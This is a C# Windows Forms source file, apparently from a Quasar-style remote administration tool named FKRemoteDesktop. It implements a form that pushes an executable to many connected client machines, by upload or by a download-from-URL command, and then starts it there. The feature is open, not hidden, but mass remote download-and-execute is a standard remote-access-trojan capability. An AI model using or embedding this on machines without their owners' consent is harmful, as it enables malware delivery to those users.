using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message;
using FKRemoteDesktop.Message.SubMessageHandler;
using FKRemoteDesktop.Network;
using FKRemoteDesktop.Structs;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Forms
{
    public partial class RemoteExecutionForm : Form
    {
        private class RemoteExecutionMessageHandler
        {
            public FileManagerHandler FileHandler;
            public TaskManagerHandler TaskHandler;
        }

        private enum ETransferColumn
        {
            eTransferColumn_Client,
            eTransferColumn_Status
        }

        private readonly Client[] _clients;
        private readonly List<RemoteExecutionMessageHandler> _remoteExecutionMessageHandlers;
        private bool _isUpdate;

        public RemoteExecutionForm(Client[] clients )
        {
            _clients = clients;
            _remoteExecutionMessageHandlers = new List<RemoteExecutionMessageHandler>(clients.Length);

            InitializeComponent();

            foreach (var client in clients)
            {
                var remoteExecutionMessageHandler = new RemoteExecutionMessageHandler
                {
                    FileHandler = new FileManagerHandler(client),
                    TaskHandler = new TaskManagerHandler(client)
                };
                var lvi = new ListViewItem(new[]
                {
                    $"{client.UserInfo.Username}@{client.UserInfo.PcName} [{client.EndPoint.Address}:{client.EndPoint.Port}]",
                    "等待中..."
                })
                { Tag = remoteExecutionMessageHandler };

                lstTransfers.Items.Add(lvi);
                _remoteExecutionMessageHandlers.Add(remoteExecutionMessageHandler);
                RegisterMessageHandler(remoteExecutionMessageHandler);
            }
        }

        private void RegisterMessageHandler(RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed += ProcessActionPerformed;
            remoteExecutionMessageHandler.FileHandler.ProgressChanged += SetStatusMessage;
            remoteExecutionMessageHandler.FileHandler.FileTransferUpdated += FileTransferUpdated;
            MessageHandler.Register(remoteExecutionMessageHandler.FileHandler);
            MessageHandler.Register(remoteExecutionMessageHandler.TaskHandler);
        }

        private void UnregisterMessageHandler(RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            MessageHandler.Unregister(remoteExecutionMessageHandler.TaskHandler);
            MessageHandler.Unregister(remoteExecutionMessageHandler.FileHandler);
            remoteExecutionMessageHandler.FileHandler.ProgressChanged -= SetStatusMessage;
            remoteExecutionMessageHandler.FileHandler.FileTransferUpdated -= FileTransferUpdated;
            remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed -= ProcessActionPerformed;
        }

        #region UI事件

        private void RemoteExecutionForm_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("远程执行", _clients.Length);
        }


        private void RemoteExecutionForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (var handler in _remoteExecutionMessageHandlers)
            {
                UnregisterMessageHandler(handler);
                handler.FileHandler.Dispose();
            }
            _remoteExecutionMessageHandlers.Clear();
            lstTransfers.Items.Clear();
        }

        private void chkUpdate_CheckedChanged(object sender, EventArgs e)
        {

        }

        // 开始远程执行 按钮
        private void btnExecute_Click(object sender, EventArgs e)
        {
            _isUpdate = chkUpdate.Checked;

            if (radioURL.Checked)
            {
                foreach (var handler in _remoteExecutionMessageHandlers)
                {
                    if (!txtURL.Text.StartsWith("http"))
                        txtURL.Text = "http://" + txtURL.Text;
                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate);
                }
            }
            else
            {
                foreach (var handler in _remoteExecutionMessageHandlers)
                {
                    handler.FileHandler.BeginUploadFile(txtPath.Text);
                }
            }
        }

        // 打开文件 按钮
        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;
                ofd.Filter = "Executable (*.exe)|*.exe";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = Path.Combine(ofd.InitialDirectory, ofd.FileName);
                }
            }
        }

        // 执行本地文件 单选框
        private void radioLocalFile_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = radioLocalFile.Checked;
            groupURL.Enabled = !radioLocalFile.Checked;
        }

        // 执行网络文件 单选框
        private void radioURL_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = !radioURL.Checked;
            groupURL.Enabled = radioURL.Checked;
        }

        #endregion

        #region 回调事件

        // 当一个文件传输更新时调用
        private void FileTransferUpdated(object sender, SFileTransfer transfer)
        {
            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;
                if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)ETransferColumn.eTransferColumn_Status].Text = transfer.Status;
                    if (transfer.Status == "传输完成")
                    {
                        handler.TaskHandler.StartProcess(transfer.RemotePath, _isUpdate);
                    }
                    return;
                }
            }
        }

        // 设置文件管理器状态
        private void SetStatusMessage(object sender, string message)
        {
            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;
                if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)ETransferColumn.eTransferColumn_Status].Text = message;
                    return;
                }
            }
        }

        private void ProcessActionPerformed(object sender, EProcessAction action, bool result)
        {
            if (action != EProcessAction.eProcessAction_Start) 
                return;

            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;

                if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)ETransferColumn.eTransferColumn_Status].Text = result ? "进程启动成功" : "进程启动失败";
                    return;
                }
            }
        }

        #endregion
    }
}
